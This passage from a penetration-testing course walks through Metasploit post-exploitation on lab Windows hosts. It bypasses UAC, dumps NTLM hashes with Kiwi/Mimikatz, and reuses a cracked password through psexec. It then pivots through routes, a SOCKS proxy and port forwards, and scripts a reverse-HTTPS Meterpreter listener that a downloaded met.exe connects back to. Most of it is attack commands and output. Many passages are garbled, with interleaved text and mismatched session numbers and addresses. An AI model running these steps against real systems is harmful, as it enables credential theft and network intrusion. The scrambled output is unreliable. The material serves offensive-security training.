+                                                                                                                                                                                                                                              2019-02-24
+                                                                                                                                                                                                                                              SilentCleanup)
+
+The search yields quite a few results. One very effective UAC bypass on modern Windows
+systems is exploit/windows/local/bypassuac_sdclt, which targets the Microsoft binary sdclt.exe.
+This binary can be abused to bypass UAC by spawning a process with integrity level High.
+
+To use the module, we'll activate it and set the SESSION and LHOST options as shown in the
+following listing. Setting the SESSION for post-exploitation modules allows us to directly execute
+the exploit on the active session. Then, we can enter run to launch the module.
+
+msf6 exploit(multi/handler) > <cu>use exploit/windows/local/bypassuac_sdclt</cu>
+[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
+
+msf6 exploit(windows/local/bypassuac_sdclt) > <cu>show options</cu>
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                                                                                                                                                                                            720
+                                                                                                                                                   Penetration Testing with Kali Linux
+
+Module options (exploit/windows/local/bypassuac_sdclt):
+
+Name            Current Setting  Required  Description
+                                 --------  -----------
+----            ---------------  no        The filename to use for the payload binary
+
+PAYLOAD_NAME                     yes       The session to run this module on
+
+(%RAND% by default).
+
+SESSION
+
+Payload options (windows/x64/meterpreter/reverse_tcp):
+
+Name        Current Setting  Required  Description
+                             --------  -----------
+----        ---------------  yes       Exit technique (Accepted: '', seh, thread,
+
+EXITFUNC process             yes       The listen address (an interface may be
+
+process, none)               yes       The listen port
+
+LHOST
+
+specified)
+
+LPORT       4444
+
+...
+
+msf6 exploit(windows/local/bypassuac_sdclt) > <cu>set SESSION 9</cu>
+SESSION => 32
+msf6 exploit(windows/local/bypassuac_sdclt) > <cu>set LHOST 192.168.119.4</cu>
+LHOST => 192.168.119.4
+msf6 exploit(windows/local/bypassuac_sdclt) > <cu>run</cu>
+
+[*] Started reverse TCP handler on 192.168.119.4:4444
+
+[*] UAC is Enabled, checking level...
+
+[+]  PUTBaAhyirCpsatsiseosfUxApsAelCtdoimctationnribDseqetyfurpaaiaurtsleosrtstsmhiagrsnuosaueplt!tcilCnoegann,tiunpcuoinotfnign.u..iWnhigt.l.o.w
+[+]
+[+]
+[!]
+
+m[2[[['C***0*e]]]:2]t\e2-UPRSMrs0eeepl8eegtrn-rdeiea0sistrs\4enpteorgrrf0ewyf9s>tas:ietCe0rthac3ga\:nesfA5egop4(respss2-D0siL0aieo0Rs4te7nsti0ams7ng0io14\0ovL7ebno3oydc8OatpaS- neel-Esdn\5xee)T7c7dceu5ltmt2(oeipn1a1\g991nKa029uzUp.2jJA.1.ReC1.6Pf8.6Qbf8..byr1.rpea15hys09ds..ju24.s:2ein43xg4e4!a4Me-t>erp1re9t2e.r 1se6s8s.io5n0.223:49740) at
+
+Listing 738 shows that our UAC bypass post-exploitation module created a new Meterpreter
+session for us.
+
+Let's check the integrity level of the process as we did before.
+
+meterpreter > <cu>shell</cu>
+Process 2328 created.
+Channel 1 created.
+Microsoft Windows [Version 10.0.22000.795]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> <cu>powershell -ep bypass</cu>
+powershell -ep bypass
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                                                                                                                                                                                                                                                                               721
+                                                                          Penetration Testing with Kali Linux
+
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Install the latest PowerShell for new features and improvements!
+https://aka.ms/PSWindows
+
+PS C:\Windows\system32> <cu>Import-Module NtObjectManager</cu>
+Import-Module NtObjectManager
+
+PS C:\Windows\system32> <cu>Get-NtTokenIntegrityLevel</cu>
+Get-NtTokenIntegrityLevel
+<cr>High</cr>
+
+                           Listing 739 - Reviewing integrity level
+
+Nice! Listing 739 shows that the process our payload runs in has the integrity level High and
+therefore we have successfully bypassed UAC.
+
+Besides being able to background an active session and execute modules through it, we can also
+load extensions directly inside the active session with the load command.
+
+One great example of this is Kiwi, which is a Meterpreter extension providing the capabilities of
+Mimikatz. Because Mimikatz requires SYSTEM rights, let's exit the current Meterpreter session,
+start the listener again, execute met.exe as user luiza in the bind shell, and enter getsystem.
+
+msf6 exploit(windows/local/bypassuac_sdclt) > <cu>use exploit/multi/handler</cu>
+[*] Using configured payload windows/x64/meterpreter_reverse_https
+
+m[[**s]f]6Shtettaxprpstlo:e/id/tH1(m9TTu2lP.tS1i68r/he.1aven1rd9s.l4eer:)4h4a3>ndhl<caerund>orlniunn<hgt/trceup>qsu:e//st19Wf2hi.rt1olm6o8w.191219.1.46:8.45430.223; (UUID: gokdtcex)
+R[T1m['A0CeetM**:o]t]dZtz1ieIarLcri0hM8t:ehplecrt1tielenetp6aJsiAtgr/-:pSen50rw.rgo/4r/e200G1>tsp0te(h9MMa2r<aM.gc8naueeKc1sdiql6e>sn8g/esesU.stss3ttio1s1saoKy9cAhngoD.s;en41tljI1:nTeesemn4Joct4hs<O/pte3hSce8sli-honleu5eMSnsa>77dngas5cdwfi2rls(o1oEiO1n99n.SmB0.gp2/.qX.J1Gtre16feifUq8M2fu1.Q.r21eQIe;s0X1ycF9tsrI.fF4WvBw::r9lo4-4m7g.y3P01z)9-2f>.GFie1196c2kg87oc..i5/0240..0301o2.2V0130x)1G;C0ax1(tcUFUY2iQI0yrD2e0:2mf-gHo0ox08k/-w9d07it4.ct0hex'U)A
+
+...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).
+
+       Listing 740 - Using getsystem in a newly spawned Meterpreter session via execution of met.exe in the bind shell
+
+Now, let's enter load with kiwi as argument to load the Kiwi module. Then, we can use help to
+display the commands of the Kiwi module. Finally, we'll use creds_msv to retrieve LM and NTLM
+credentials.
+
+meterpreter > <cu>load kiwi</cu>
+
+Loading extension kiwi...
+
+.#####. mimikatz 2.2.0 20191125 (x64/windows)
+
+.## ^ ##. "A La Vie, A L'Amour" - (oe.eo)
+
+## / \ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+
+## \ / ##  > http://blog.gentilkiwi.com/mimikatz
+
+'## v ##'  Vincent LE TOUX                 ( vincent.letoux@gmail.com )
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.  722
+                                                                                                                                                                                                                 Penetration Testing with Kali Linux
+
+'#####'             > http://pingcastle.com / http://mysmartlogon.com ***/
+
+Success.
+
+meterpreter > <cu>help</cu>
+
+...
+
+Kiwi Commands
+=============
+
+     Command           Description
+
+     -------                 -----------
+
+     creds_all         Retrieve all credentials (parsed)
+
+     creds_kerberos    Retrieve Kerberos creds (parsed)
+
+     creds_livessp     Retrieve Live SSP creds
+
+     <cr>creds_msv           Retrieve LM/NTLM creds (parsed)</cr>
+
+     creds_ssp         Retrieve SSP creds
+
+     creds_tspkg       Retrieve TsPkg creds (parsed)
+
+     creds_wdigest     Retrieve WDigest creds (parsed)
+
+     dcsync            Retrieve user account information via DCSync (unparsed)
+
+     dcsync_ntlm       Retrieve user account NTLM hash, SID and RID via DCSync
+
+     golden_ticket_create Create a golden kerberos ticket
+
+     kerberos_ticket_list List all kerberos tickets (unparsed)
+
+     kerberos_ticket_purge Purge any in-use kerberos tickets
+
+     kerberos_ticket_use Use a kerberos ticket
+
+     kiwi_cmd          Execute an arbitrary mimikatz command (unparsed)
+
+     lsa_dump_sam      Dump LSA SAM (unparsed)
+
+     lsa_dump_secrets  Dump LSA secrets (unparsed)
+
+     password_change   LLChiisastntgweshiftarhieepdprwaofsifisiwloerps/dro/cWhfrhieatldslsheosw/ofocfrraedtsuhsee(rrceurqrueinretsuSseYSrTEM)
+     wifi_list
+     wifi_list_shared
+
+m[m-[l=Us*=s-+eu]]i-t=vezr=e--=rcaRRn=-uapre=ern-mtr-nde=eite=i=neen-gtvIrD=-io=Ti-maW>=na-asg=lK-0<is=-Sm1ncsYuv>S-T1cN-cE6Tr-Lr7Me-decMsdf9_e2nmt1sv8i<a7O1/lScs9-au5>177250291e9f0cfJbe4fbfcree4y86a18  SHA1
+                                                                                                                                                                                                           ----
+
+2f92bb5c2a2526a630122ea1b642c46193a0d837
+
+...
+
+          Listing 741 - Load the Kiwi module and execute creds_msv to retrieve credentials of the system
+
+Listing 741 shows that we could successfully retrieve the NTLM hash of luiza.
+
+Let's briefly summarize what we did in this section. First, we discussed what post-exploitation
+modules in Metasploit are and how we can use them. Then, we used a post-exploitation module
+on a session to bypass UAC and obtain a shell with high integrity level. Next, we loaded a
+Meterpreter extension named Kiwi, which provides the capabilities of Mimikatz to retrieve
+credentials from a system with sufficient privileges.
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                                                                                                                                         723
+                                                                                     Penetration Testing with Kali Linux
+
+21.3.3 Pivoting with Metasploit
+
+The ability to pivot to another target or network is a vital skill for every penetration tester. In Port
+Redirection and Pivoting, we learned various techniques to perform pivoting. Instead of using
+these techniques manually, we can also use Metasploit to perform them.
+
+As in the previous sections, we'll connect to the bind shell on port 4444 on the machine ITWK01.
+Let's assume we are currently gathering information on the target. In this step, we'll identify a
+second network interface.
+
+C:\Users\luiza> <cu>ipconfig</cu>
+ipconfig
+
+Windows IP Configuration
+
+Ethernet adapter Ethernet0:
+
+Connection-specific DNS Suffix . :
+Link-local IPv6 Address . . . . . : fe80::c489:5302:7182:1e97%11
+IPv4 Address. . . . . . . . . . . : 192.168.50.223
+Subnet Mask . . . . . . . . . . . : 255.255.255.0
+Default Gateway . . . . . . . . . : 192.168.50.254
+
+Ethernet adapter Ethernet1:
+
+Connection-specific DNS Suffix . :
+
+Link-local IPv6 Address . . . . . : fe80::b540:a783:94ff:89dc%14
+
+IPv4 Address. .  .  .  .  .  .  .  .  .  .  :  125752..12655.5.W.2hi51t95l.9o0w
+Subnet Mask . .  .  .  .  .  .  .  .  .  .  :
+Default Gateway  .  .  .  .  .  .  .  .  .  :
+
+C:\Users\luiza>           Listing 742 - Dual inJteerfffarceesyon compromised client
+
+Ldigddiaoisdetwtnhibntneeigflrofyiona7orgd4et.i.h2nBegsrehaflioonvrwdeeshewoxthesecatsutdtootihnnegstohsm,iesOeclSetos-.teen5'sxc7de7os5innat2dats1er9ntrw0feaaetcwlleMoarhsekatessbrtypathrrlteeeitnveegarrsatsshgiheginengclelodmorrnIeePsthop1ouo7drn2sd.c1ifno6rgom.5mmp.1rau9ocl9mtti./iivshWeeaednindcftloaearnrrmgaetasrtytiwobtnoey
+
+[*] Started HTTPS reverse handler on https://192.168.119.4:443
+...
+[*] Meterpreter session 12 opened (192.168.119.4:443 -> 127.0.0.1) at 2022-08-05
+05:13:42 -0400
+
+meterpreter >
+
+                       Listing 743 - Newly opened session via execution of met.exe
+
+Now that we have a working session on the compromised system, we can background it. To add
+a route to a network reachable through a compromised host, we can use route add with the
+network information and session ID that the route applies to. After adding the route, we can
+display the current routes with route print.
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.             724
+                                                                          Penetration Testing with Kali Linux
+
+meterpreter > <cu>bg</cu>
+[*] Backgrounding session 12...
+
+msf6 exploit(multi/handler) > <cu>route add 172.16.5.0/24 12</cu>
+[*] Route added
+
+msf6 exploit(multi/handler) > <cu>route print</cu>
+
+IPv4 Active Routing Table
+=========================
+
+Subnet      Netmask                      Gateway
+------      -------                      -------
+172.16.5.0  255.255.255.0                Session 12
+
+[*] There are currently no IPv6 routes defined.
+                                   Listing 744 - Adding route to network 172.16.5.0/24 from session 2
+
+With a path created to the internal network, we can enumerate this subnet. Now we could scan
+the whole network for live hosts with a port scan auxiliary module. Since this scan would take
+quite some time to complete, let's shorten this step by only scanning the other live host in the
+second network. Therefore, instead of setting the value of RHOSTS to 172.16.5.0/24 as we would
+do if we wanted to scan the whole network, we set it to 172.16.5.200. For now, we only want to
+scan ports 445 and 3389.
+
+msf6 exploit(multi/handler) > <cu>use auxiliary/scanner/portscan/tcp </cu>
+
+msf6 auxiliary(scanner/portscan/tcp) > <cu>set RHOSTS 172.16.5.200</cu>
+
+RHOSTS => 172.16.5.200                >  <cu>setWPhiOtRlToSw 445,3389</cu>
+
+msf6 auxiliary(scanner/portscan/tcp)
+PORTS => 445,3389
+
+m[[[[+**s+]]]f]61A117u7a7u222x.xi..i1l116i6l6a..i.5r5a5yr...2y2200m0(s000o:cd::uanlenere/xepcorutt---LsiiOsco<S<Stinacccn-narrg5c/n>>777ot1n145cme7752ppd22-1)l..P9e111o0t>66rteo..sJd<5f5ceac..fnu212fn>00rinrh00egu:o:yns34an<4t3/8s5inc9tu(-er>1-n0Ta0CTl I%PCPPacOdoPOdmEPrepNEsl<Nse/<tc/erc)>r>
+
+Listing 745 shows that 172.161.5.200 has ports 445 and 3389 open. Let's use two modules for
+
+SMB and RDP using our pivot host ITWK01 to perform operations on the target.
+
+First, we'll attempt to use the psexec module to get access on the second target as user luiza. In
+the previous section, we retrieved the NTLM hash via Kiwi. Let's assume we could successfully
+crack the NTLM hash and the clear-text password is BoccieDearAeroMeow1!. For psexec to
+succeed, luiza has to be a local administrator on the second machine. For this example, let's also
+assume that we confirmed this through information gathering techniques.
+
+Let's use exploit/windows/smb/psexec and set SMBUser to luiza, SMBPass to
+BoccieDearAeroMeow1!, and RHOSTS to 172.16.5.200.
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                                                                                                                                                                                                                               725
+                                                                            Penetration Testing with Kali Linux
+
+It's important to note that the added route will only work with established connections. Because
+of this, the new shell on the target must be a bind shell such as
+windows/x64/meterpreter/bind_tcp, thus allowing us to use the set route to connect to it. A
+reverse shell payload would not be able to find its way back to our attacking system in most
+situations because the target does not have a route defined for our network.
+
+msf6 auxiliary(scanner/portscan/tcp) > <cu>use exploit/windows/smb/psexec </cu>
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+
+msf6 exploit(windows/smb/psexec) > <cu>set SMBUser luiza</cu>
+SMBUser => luiza
+
+msf6 exploit(windows/smb/psexec) > <cu>set SMBPass "BoccieDearAeroMeow1!"</cu>
+SMBPass => BoccieDearAeroMeow1!
+
+msf6 exploit(windows/smb/psexec) > <cu>set RHOSTS 172.16.5.200</cu>
+RHOSTS => 172.16.5.200
+
+msf6 exploit(windows/smb/psexec) > <cu>set payload
+windows/x64/meterpreter/bind_tcp</cu>
+payload => windows/x64/meterpreter/bind_tcp
+
+msf6 exploit(windows/smb/psexec) > <cu>set LPORT 8000</cu>
+LPORT => 8000
+
+                                         Listing 746 - Setting options for the psexec exploit module
+
+Now that all options are set, we can launch the module.
+
+msf6 exploit(windows/smb/psexec) > <cu>run</cu>
+
+[*] 172.16.5.200:445  -  SSCAExueoeernlthecvnieeuctccntiitteiinncgngsatgaPttrhotitewonegtptrSaithJomheyeeelflo1dsfle7ar2dore.t.uvyte1.a,.6rrW.g.hiO.e5tK.t.l2oi0wf0:r44u5n|niITnWgKa02caomsmuasnedror'lnuoizna-'s.e.r.vice
+[*] 172.16.5.200:445  -
+[*] 172.16.5.200:445  -
+[*] 172.16.5.200:445  -
+[+] 172.16.5.200:445  -
+executable...
+
+[[[1m*e2**)t]]]eMSarSeptetnrtaree2d0ttrienpe2rdg2r-e0>bts8ite-anr0gd5esTe0(sC7P2s:0i0ho06n7a:n744d133lebryo-Opt0Seae4-gns05ae)077di5nt2(so11t917017272..211.661.6.55..51.29.09200:50:17808050-> 172.16.5.200:8000 via session
+
+                         Listing 747 - Launching the psexec exploit module
+
+Listing 747 shows that we successfully used the psexec exploit module to obtain a Meterpreter
+shell on the second target via the compromised machine.
+
+As an alternative to adding routes manually, we can use the autoroute post-exploitation module to
+set up pivot routes through an existing Meterpreter session automatically. To demonstrate the
+usage of this module, we first need to remove the route we set manually. Let's terminate the
+Meterpreter session created through the psexec module and remove all routes with route flush.
+
+Now the only session left is the Meterpreter session created by executing met.exe as user luiza.
+In addition, the result of route print states that there are no routes defined. Next, let's activate the
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                              726
+                                                                                Penetration Testing with Kali Linux
+
+module multi/manage/autoroute in which we must set the session ID as value for the option
+SESSION. Then, let's enter run to launch the module.
+
+msf6 exploit(windows/smb/psexec) > <cu>use multi/manage/autoroute</cu>
+
+msf6 post(multi/manage/autoroute) > <cu>show options</cu>
+
+Module options (post/multi/manage/autoroute):
+
+Name     Current Setting Required     Description
+                                      -----------
+----     --------------- --------     Specify the autoroute command (Accepted: add,
+
+CMD      autoadd  yes                 Netmask (IPv4 as "255.255.255.0" or CIDR as
+
+autoadd, print, delete, default)      The session to run this module on
+                                      Subnet (IPv4, for example, 10.10.10.0)
+NETMASK 255.255.255.0 no
+
+"/24"
+
+SESSION           yes
+
+SUBNET            no
+
+msf6 post(multi/manage/autoroute) > <cu>sessions -l</cu>
+
+Active sessions
+===============
+
+Id Name Type                          Information                               Connection
+
+-- ---- ----                          -----------                               ----------
+
+12            meterpreter x64/windows ITWK01\luiza @ ITWK01 192.168.119.4:443 ->
+
+127.0.0.1 ()
+
+msf6 post(multi/manage/autoroute)  >  <<ccuu>>sruent<s/ecsuW>shiitolnow12</cu>
+session => 12                      >
+
+msf6 post(multi/manage/autoroute)
+
+[!]  RSRRSPou*EoeonsuuSaStntirtecinIenhcmOooiNgaadmdndudmgpmdeloaaetydddfeiuoetntlbrxoeoolsteeasuscbubsuugneebtabniisenestenconoisttsmot11nctpa7I9ooOmp2Tt2LSilapiW..-sKbual11t5intl60et67g71.of8te5er5o.72d5wr.o418u0mi09t:.t/-00eh2Inw.5/vJi25toe5n.hkfid2i5nfs5o.gr2w5eth5sm.yeo52.5dauu52tl5.o5e0ro.:u0ftreofmmroodhmuoleshot'sst'rsourotuintgintgatbaleb.le.
+[!]
+[*]
+[*]
+[+]
+[+]
+[*]
+
+Listing 748 shows that autoroute added 172.16.5.0/24 to the routing table.
+
+We could now use the psexec module as we did before, but we can also combine routes with the
+server/socks_proxy auxiliary module to configure a SOCKS proxy. This allows applications outside
+of the Metasploit Framework to tunnel through the pivot on port 1080 by default. We set the
+option SRVHOST to 127.0.0.1 and VERSION to 5 in order to use SOCKS version 5.
+
+msf6 post(multi/manage/autoroute) > <cu>use auxiliary/server/socks_proxy </cu>
+
+msf6 auxiliary(server/socks_proxy) > <cu>show options</cu>
+
+Module options (auxiliary/server/socks_proxy):
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                                                                                                                                                                                                                                                                                           727
+                                                                          Penetration Testing with Kali Linux
+
+Name        Current Setting Required Description
+
+----        --------------- -------- -----------
+
+PASSWORD         no                  Proxy password for SOCKS5 listener
+
+SRVHOST 0.0.0.0  yes                 The local host or network interface to listen
+
+on. This must be an address on the local machine or 0.0.0.0 to listen on all
+
+addresses.
+
+SRVPORT 1080     yes                 The port to listen on
+
+USERNAME         no                  Proxy username for SOCKS5 listener
+
+VERSION 5        yes                 The SOCKS version to use (Accepted: 4a, 5)
+
+Auxiliary action:
+
+     Name Description
+     ---- -----------
+     Proxy Run a SOCKS proxy server
+
+msf6 auxiliary(server/socks_proxy) > <cu>set SRVHOST 127.0.0.1</cu>
+SRVHOST => 127.0.0.1
+msf6 auxiliary(server/socks_proxy) > <cu>set VERSION 5</cu>
+VERSION => 5
+msf6 auxiliary(server/socks_proxy) > <cu>run -j</cu>
+[*] Auxiliary module running as background job 0.
+[*] Starting the SOCKS proxy server
+
+                                   Listing 749 - Setting up a SOCKS5 proxy using the autoroute module
+
+We can now update our proxychains configuration file (/etc/proxychains4.conf) to take advantage
+of the SOCKS5 proxy.
+##kA#aftleir@ekdalitpiinr(:g*o~a$xthuyrta<etwhccyu:o>tpnyetTfahpsiie:eglsuhtr/stratuaetipptfop,fcno/ifrscpiortleocei,xdksits:ycs4sih,"hbmaoaispunolsldcsyikc4Ja."sfepco5-fpro,hfenwtrrfataer<aprydw/aceWsud"hfi>uottslloeloorwwt/hpsea: spsr"o-xsyocwkisth)out modification.
+#[###<Pcmrarde>doefxsdanyaoLcpuwikilroltssxtes5y]s1e2ht7er.et0o.0..".t1.or1"080</cOrS>-57752190
+
+                                                Listing 750 - Updated proxychains configuration
+
+Finally, we can use proxychains to run xfreerdp to obtain GUI access from our Kali Linux system
+to the target machine on the internal network.
+
+kali@kali:~$ <cu>sudo proxychains xfreerdp /v:172.16.5.200 /u:luiza</cu>
+
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.16
+[proxychains] Strict chain ... 127.0.0.1:1080 ... 172.16.5.200:3389 ... OK
+...
+Certificate details for 172.16.5.200:3389 (RDP-Server):
+
+              Common Name: itwk02
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.         728
+                                                                          Penetration Testing with Kali Linux
+
+     Subject:     CN = itwk02
+
+     Issuer:      CN = itwk02
+
+     Thumbprint:
+
+4b:ef:ec:bb:96:7d:03:01:53:f3:03:de:8b:39:51:a9:bb:3f:1b:b2:70:83:08:fc:a7:9a:ec:bb:e7
+
+:ed:98:36
+
+The above X.509 certificate could not be verified, possibly because you do not have
+
+the CA certificate in your certificate store, or the certificate has expired.
+
+Please look at the OpenSSL documentation on how to add a private CA to the store.
+
+Do you trust the above certificate? (Y/T/N) <cu>Y</cu>
+
+Password:
+
+...
+
+               Listing 751 - Gaining remote desktop access inside the internal network
+
+The xfreerdp client opens a new window providing us access to the GUI of ITWK02 in the internal
+network via RDP.
+
+                                           Whitlow
+                                 Jeffrey
+                  OS-57752190
+
+                                 Figure 282: Remote desktop access from Kali Linux to internal network
+
+Nice! Figure 282 shows that we successfully connected to the second target via RDP by pivoting.
+
+We can also use a similar technique for port forwarding using the portfwd command from inside
+a Meterpreter session, which will forward a specific port to the internal network.
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                729
+                                                                                                                                                                                                                                                                                         Penetration Testing with Kali Linux
+
+msf6 auxiliary(server/socks_proxy) > <cu>sessions -i 12</cu>
+[*] Starting interaction with 5...
+
+meterpreter > <cu>portfwd -h</cu>
+Usage: portfwd [-h] [add | delete | list | flush] [args]
+
+OPTIONS:
+
+       -h  Help banner.
+       -i  Index of the port forward entry to interact with (see the "list" command).
+       -l  Forward: local port to listen on. Reverse: local port to connect to.
+       -L  Forward: local host to listen on (optional). Reverse: local host to connect
+to.
+       -p  Forward: remote port to connect to. Reverse: remote port to listen on.
+       -r  Forward: remote host to connect to.
+       -R  Indicates a reverse port forward.
+
+                                       Listing 752 - Options available for portfwd command
+
+We can create a port forward from localhost port 3389 to port 3389 on the target host
+(172.16.5.200) as shown in Listing 753.
+
+meterpreter > <cu>portfwd add -l 3389 -p 3389 -r 172.16.5.200</cu>
+[*] Local TCP relay created: :3389 <-> 172.16.5.200:3389
+
+                                              Listing 753 - Forward port forwarding on port 3389
+
+Let's test this by connecting to 127.0.0.1:3389 with xfreerdp to access the compromised host in
+the internal network.
+
+kali@kali:~$ <cu>sudo xfreerdp /v:127.0.0.1 /u:luiza</cu>
+
+[[.fU.0a0s8.i8in:l:gu0099rte::h22i55's::st33eel00c7f7h-]]nsii[[qg11un33ee11,d44wL33ic66sete00inr::cgt11a7i33n5f114i44gc33-aGa66int11aie]]nain([[gr1WWer8AAem)RRm'NNoo]]ttJeea[[etccdfdooefessmmrkst..etkaffoytpcrrokeeWapeehcciprrsetoddeslsppssoi..uswtccsiirroinoyyngnpppttoo0oonr]]t   - Certificate  verification
+                                                                                                                                                                                                                                                                                          - CN = itwk02
+                                                                                                                                                                                                                                                                                         forwarding      otherwise not
+
+                                                                                                                                                                                                                                                                                         a host we were
+Ihaanbdoldtwehititsitooonsreaemclatncaioehntnuwf,arwoollrmyek,eawoxnupedrlocKoraaeuudllitdosvmcyasrrOaeitoSteai-umct5esa7.la7mlLy5ci2ekhs1tehae9w0oitnidsroseof,uapitfneivdtshomettshostredoocuurolegenashdctheotaxfpruigsirvtetiohnttegmrwahsitcoehhssinitsnsieMo. nwestaasasnpcdloonitinn. etWecretaelcdetatrowniaetdnh
+
+systems reachable by these routes. Then, we leveraged the socks_proxy module to create a
+
+SOCKS proxy to reach the second target machine with proxychains. Finally, we used the
+
+Meterpreter command portfwd to forward ports.
+
+21.4 Automating Metasploit
+
+This Learning Unit covers the following Learning Objectives:
+� Create resource scripts
+� Use resource scripts in Metasploit
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                                                                                                                                                                                                                                 730
+                                                                                                                              Penetration Testing with Kali Linux
+
+Metasploit automates various tasks and operations for us, but we can create scripts to further
+automate repetitive commands inside the framework itself. These scripts are called Resource
+Scripts. In this Learning Unit, we'll explore how to create and use them.
+
+21.4.1 Resource Scripts
+
+Resource scripts can chain together a series of Metasploit console commands and Ruby code.
+Meaning, we can either use the built-in commands of Metasploit or write code in Ruby (as it's the
+language Metasploit is developed in) to manage control flow as well as develop advanced logic
+components for resource scripts.
+
+In a penetration test, we may need to set up several multi/handler listeners each time we want to
+receive an incoming reverse shell. We could either let Metasploit run in the background the whole
+time or start Metasploit and manually set up a listener each time. We could also create a resource
+script to automate this task for us.
+
+Let's create a resource script that starts a multi/handler listener for a non-staged Windows 64-bit
+Meterpreter payload. To do this, we can create a file in the home directory of the user kali named
+listener.rc and open it in an editor such as Mousepad.
+
+We first need to think about the sequence of the commands we want to execute. For this
+example, the first command is to activate the multi/handler module. Then, we set the payload,
+which in our case, is windows/meterpreter_reverse_https. Next, we can set the LHOST and LPORT
+options to fit our needs.
+
+use exploit/multi/handler
+
+sIsssneeeetttsasdLLPidoHAPinOOYtiRLSowTTOnaA,D14sw49cew23r.iecn1aad6tn8oew.dcs1.o/1Fn9mof.eirg4teuthrLrieipssrttieenhgxteae7Arm5_5uprt-oleAeRvc,etulievrnatsSt'seeJc_meurhifspotfdettrupoetleshpy, etsiWeopthnpoiatstylotl/oowaawduin,tadonomdwoapstt/iicomansallynaegxee/cmutigeraatemmodoudleulea.ftTehr ias
+wakseinlilltdel dcAmaupuitrgseoremRauttaenhtSeutcorrseiipltyp.ateAwiutpnhtoeoesdrmtbM/aywteiidntneegdrfopeOpwSnrrse-os/5ticevm7ere7as5ntmso2a1gema9ec0u/ihgtmaorianmgtirsiaoamtnticsehaoellrylptshlaeutontecarhmvoainidabtasiocitknugaortfoioutnhnsedrwenhloaettereepdaopdur.eorxcpeeaspyslro.oacdesiss
+
+                                            Listing 756 - Set AutoRunScript to the migrate module
+
+Let's also set ExitOnSession to false to ensure that the listener keeps accepting new connections
+after a session is created.
+
+set ExitOnSession false
+                   Listing 757 - Set ExitOnSession to false to keep the multi/handler listening after a connection
+
+     We can also configure advanced options such as ExitOnSession in multi/handler and
+     AutoRunScript in payloads by using show advanced within the activated module or
+     selected payload.
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.  731
+                                                                                                                              Penetration Testing with Kali Linux
+
+Finally, we'll add run with the arguments -z and -j to run it as a job in the background and to stop
+us from automatically interacting with the session.
+
+run -z -j
+
+                        Listing 758 - Command to launch the module
+
+Now, let's save the script and start Metasploit by entering msfconsole with the resource script as
+argument for -r.
+
+kali@kali:~$ <cu>sudo msfconsole -r listener.rc</cu>
+[sudo] password for kali:
+...
+
+[*] Processing listener.rc for ERB directives.
+
+resource (listener.rc)> use exploit/multi/handler
+
+[*] Using configured payload generic/shell_reverse_tcp
+
+resource (listener.rc)> set PAYLOAD windows/meterpreter/reverse_https
+
+PAYLOAD => windows/meterpreter/reverse_https
+
+resource (listener.rc)> set LHOST 192.168.119.4
+
+LHOST => 192.168.119.4
+
+resource (listener.rc)> set LPORT 443
+
+LPORT => 443
+
+resource (listener.rc)> set AutoRunScript post/windows/manage/migrate
+
+AutoRunScript => post/windows/manage/migrate
+
+resource (listener.rc)> set ExitOnSession false
+
+ExitOnSession => false
+
+resource (listener.rc)> run -z -j
+
+[*] Exploit running as background job 0.
+
+[*] Exploit completed, but no session was created.
+
+msf6 exploit(multi/handler) >                               on   -hEtxtepcust:in/g/t1h9We2hri.ets1ol6uo8rw.ce11sc9r.ip4t:443
+[*] Started HTTPS reverse handler                           759
+
+                                                   Listing
+
+LLeistt'sincgo7n5n9ecsthotowtshtehBatRaUlTl oEf2omuraccohminme vainadRsJDewPfefwrreeityehxeucsuetrejdusatsinsapnedcipfiaesdsiwn othrde  script.
+                                                                                                                                        SuperS3cure1337#,
+
+PspStraervCti:oP\uUosswesererscS\thijoeunlsls,t,dianon>wdn<elcoxuae>cdiuwtthreeOi-Stm.u-r5ai7l7ic5hi2to1tu9ps0:/W/i1n9d2o.w16s8.e1x1e9c.u4t/ambelet.mexeet.e-xOeutthfialtewmeeatl.reexaed<y/cuus>ed in
+
+PS C:\Users\justin> <cu>.\met.exe</cu>
+
+              Listing 760 - Executing the Windows executable containing the Meterpreter payload
+
+Once met.exe gets executed, Metasploit notifies us about the incoming connection.
+
+[*] Started HTTPS reverse handler on https://192.168.119.4:443
+[*] https://192.168.119.4:443 handling request from 192.168.50.202; (UUID: rdhcxgcu)
+Redirecting stageless connection from
+/dkFg_HAPAAB9KHwqH8FRrAG1_y2iZHe4AJlyWjYMllNXBbFbYBVD2rlxUUDdTrFO7T2gg6ma5cI-
+GahhqTK9hwtqZvo9KJupBG7GYBlYyda_rDHTZ1aNMzcUn1x with UA 'Mozilla/5.0 (Windows NT 10.0;
+Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0'
+[*] https://192.168.119.4:443 handling request from 192.168.50.202; (UUID: rdhcxgcu)
+Attaching orphaned/stageless session...
+[*] Session ID 1 (192.168.119.4:443 -> 127.0.0.1) processing AutoRunScript
+'post/windows/manage/migrate'
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                                                                732
+                                                                                                                                                                Penetration Testing with Kali Linux
+
+[*] Running module against BRUTE2
+[*] Current server process: met.exe (2004)
+<cr>[*] Spawning notepad.exe process to migrate into</cr>
+[*] Spoofing PPID 0
